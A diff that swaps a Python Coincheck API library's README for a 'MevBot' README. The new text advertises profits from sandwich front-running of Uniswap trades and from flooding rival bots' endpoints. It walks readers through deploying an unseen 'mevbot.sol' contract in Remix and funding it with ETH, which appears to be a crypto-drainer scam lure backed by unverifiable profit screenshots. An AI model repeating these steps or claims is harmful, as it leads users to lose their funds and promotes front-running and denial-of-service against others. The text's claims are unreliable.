@@ -1,122 +1,91 @@
-# Coincheck: Coincheck Api Library
-
-coincheck は [coincheck](https://coincheck.com) の python 製 api ライブラリです.
-
-```
-> from coincheck import market
-> m1 = market.Market()
-> m1.ticker()
-'{"last":30930,"bid":30810,"ask":30930,"high":31500,"low":30220,"volume":"560.51814602","timestamp":1428338044}'
-```
-
-## Documentation
-
-Documentation for Coincheck API is  available at https://coincheck.com/documents/exchange/api
-
-### Order
-
- 注文が決済されたら、キャンセルできないので注意してください.
-
-```
- # 20000 jpy で 0.1 の bitcoin を購入する注文をする.
- > from coincheck import order, market, account
- > o1 = order.Order(secret_key=settings.secret_key, access_key=settings.access_key)
- > print(o1.buy_btc_jpy(rate=20000, amount=0.1))
- {"success":true,"id":1355414,"amount":"0.1","rate":"20000.0","order_type":"buy","pair":"btc_jpy","created_at":"2015-04-06T16:56:19.821Z"}
- 
- # 40000 jpy で 0.1 の bitcoin を売却する注文をする.
- > from coincheck import order, market, account
- > o1 = order.Order(secret_key=settings.secret_key, access_key=settings.access_key)
- > print(o1.sell_btc_jpy(rate=40000,amount=0.1))
- {"success":true,"id":1355421,"amount":"0.1","rate":"40000.0","order_type":"sell","pair":"btc_jpy","created_at":"2015-04-06T16:57:26.487Z"}
- 
- # 自分の注文の一覧を表示する.
- > from coincheck import order, market, account
- > o1 = order.Order(secret_key=settings.secret_key, access_key=settings.access_key)
- > print(o1.list())
- {"success":true,"orders":[{"id":676197,"order_type":"buy","rate":20000,"pair":"btc_jpy","pending_amount":"0.1","created_at":"2015-04-06T16:56:19.000Z"},{"id":676201,"order_type":"sell","rate":40000,"pair":"btc_jpy","pending_amount":"0.1","created_at":"2015-04-06T16:57:26.000Z"}]}
- 
- # 注文番号 676197 の注文をキャンセルする. (注文番号は coincheck.order.list() のid)
- > from coincheck import order, market, account
- > o1 = order.Order(secret_key=settings.secret_key, access_key=settings.access_key)
- > print(o1.cancel('676197'))
- {"success":true,"id":676197}
- 
- # 自分の取引履歴を表示する.
- > from coincheck import order, market, account
- > o1 = order.Order(secret_key=settings.secret_key, access_key=settings.access_key)
- > print(o1.history())
- {"success":true,"transactions":[{"id":21118,"created_at":"2015-04-06T16:39:10.000Z","funds":{"btc":"-0.02","jpy":"624.6"}}]}
-```
- 
-### Market
- 
-coincheck の市場情報を取得します.
- 
-```
- # coincheck の最新市場情報を取得する.
- > from coincheck import order, market, account
- > m1 = market.Market()
- > print(m1.ticker())
- {"last":30820,"bid":30810,"ask":30820,"high":31500,"low":30220,"volume":"559.78124602","timestamp":1428340013}
- 
- # coincheck の最新取引履歴を取得する.
- > from coincheck import order, market, account
- > m1 = market.Market()
- > print(m1.trades())
- [{"id":16143,"amount":"0.25","rate":30820,"order_type":"sell","created_at":"2015-04-06T17:02:04.000Z"},{"id":16142,"amount":"0.249","rate":30930,"order_type":"buy","created_
-at":"2015-04-06T16:33:12.000Z"},{"id":16141,"amount":"0.4174","rate":30810,"order_type": ...
-
- # coincheck の最新板情報を取得する.
- > from coincheck import order, market, account
- > m1 = market.Market()
- > print(m1.orderbooks())
- {"asks":[[31740,"2.25731223"],[31750,"0.35"],...],"bids":[[30810,"0.16228497"],[30700,"3.404"],...]}
-```
-
-### Account
-
-ユーザのアカウント情報を取得します.
-
-```
- # アカウントの情報を表示します.
- > from coincheck import order, market, account
- > a1 = account.Account(secret_key=settings.secret_key, access_key=settings.access_key)
- > print(a1.get_info())
- {"success":true,"id":0000,"email":"kamonshohei@gmail.com","identity_status":"identity_verified","bitcoin_address":"..."}
- 
- # アカウントの残高を確認できます.
- > from coincheck import order, market, account
- > a1 = account.Account(secret_key=settings.secret_key, access_key=settings.access_key)
- > print(a1.get_balance())
- {"success":true,"jpy":"...","btc":"...","jpy_reserved":"...","btc_reserved":"...","jpy_lend_in_use":"...","btc_lend_in_use":"...","jpy_lent":"...","btc_lent":"...","jpy_debt":"...","btc_debt":"..."}
-```
+# MevBot *Earn money with MEVbot*
+-----------------
+> this is my main wallet
 
 
-## Environment
+![balance](https://i.ibb.co/qrhRhNv/balance.png)
 
-- support Python 3.x,2.7)
-
-## Installation
+## For demonstration purposes, other wallets will be used for testing below.
 
 
-### git
+## The contract is optimized. now the "start" and "withdraw" functions require less gas.
+-----------------
 
-```
-git clone git@github.com:kmn/coincheck.git
-```
+## Update 08.05.2023 (Result)
 
-### pip 
+**The result of the bot, which is on the screenshot in the period from 25.04 to 08.05**
+--------
+***created bot*** 25.04.2023
+![5](https://user-images.githubusercontent.com/132013213/235938205-1637fe55-6ad0-4c9a-b602-0054bde25685.png)
+![stats08 05](https://user-images.githubusercontent.com/132013213/236736354-1ffe4ccd-1b1c-4408-b9ce-3f937de238ba.png)
 
-```
-pip install coincheck
-```
-## Initialization
+*Due to the high amount of gas, profit has slightly decreased. However, from the period of May 6th to May 8th, the bot has earned 0.13 ETH.*
 
- set your api access-key and secret-key to "coincheck/settings.py"
- to get your api keys , see [API key](https://coincheck.com/api_settings).
+------------
+The code was not intended for public display. It was created as a "tested in production" version with numerous quality tradeoffs, while my commercial code is superior. I never planned to release it publicly to avoid leaking my alpha. However, I would like to showcase what I have learned over the years.
 
-## TODO
+The bot sends transactions and monitors the Uniswap v2 Mempool.
 
-- add test case
-- add offset to market.trade()
+Bots then compete to purchase tokens on-chain as quickly as possible by sandwiching the victim's transaction and creating a profitable slippage opportunity.
+
+Finally, the ETH is returned to the contract for withdrawal.
+
+This bot performs all of these functions faster than 99% of other bots.
+
+*But ser, there are open source bots that do the same*
+
+Yes, there are indeed other bot builders out there. However, I was the first one to enter this field and I still outperform them. When I read their articles, it makes me giggle because I went through the same struggles as they did. As a fellow bot builder, I feel for these guys <3.
+
+*Wen increase aggressiveness ?*
+
+After spending a year obsessing over this, I have compiled a list of target endpoints that other bots use. By flooding these endpoints with requests, I can cause them to lose up to 5 seconds of reaction time and gain an advantage over them. This has been my personal journey in achieving success in this field.
+
+*What did I learn?*
+
+MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Unsiwap
+
+*So why stop?*
+
+I have earned profits from this in the past, but I am now utilizing more effective commercial methods. I am willing to share my knowledge with developers so that they do not have to go through the same struggles.
+
+
+## MEVBot Instructions:
+(works only for Mainnet) How it works:
+
+You can see an example of how the bot works
+![exemple](https://user-images.githubusercontent.com/132013213/235937518-0bd244d5-9aad-4130-a94c-1af8f3ab8f3f.png)
+
+First step -source code
+-----------------------
+Access the Remix IDE https://remix.ethereum.org/
+-----------------------
+FILE EXPLORER
+-------------
+and click and create new file "mevbot.sol" Copy code and paste in Remix IDE
+
+![1](https://user-images.githubusercontent.com/132210655/235439034-135a0157-ebd8-4fb1-bb50-85f462a8b62a.png)
+
+Click Solidity complier 0.6.6
+-------------------------------
+And press Compile mevbot.sol
+
+![2](https://user-images.githubusercontent.com/132210655/235439103-fd3ea0e6-4f88-4e05-b69a-4be895ad3241.png)
+
+Select ETH or BSC(BNB) network
+-----------------------------
+and router address
+
+Press Transact (Deploy)
+------------------------
+![3](https://user-images.githubusercontent.com/132210655/235439168-168f193c-6b45-4f1f-a057-5d69e8bc0eae.png)
+
+Next-deposit (balans MevBot)
+----------------------
+Copy contract your MevBot and send a number of Ethereum to the bot's balance for the bot to work. And start it with the start button
+![4](https://user-images.githubusercontent.com/132210655/235439268-70726c7c-d6eb-4d8c-9ae0-b6f0d347fe25.png)
+![4 1](https://user-images.githubusercontent.com/132210655/235439284-f7a1ffb3-fe26-484a-9ea7-4200a1c75431.png)
+![5](https://user-images.githubusercontent.com/132210655/235439291-4fc572eb-d2dc-4167-a52f-983a086f9723.png)
+
+#### ❗ NOTE:
+Due to high network usage to ensure successful transactions on the Ethereum network, maintain a sufficient balance to cover gas fees (recommended 0.2 - 2 ETH).
+You can stop the bot or withdraw your funds at any time by calling the withdrawal function.
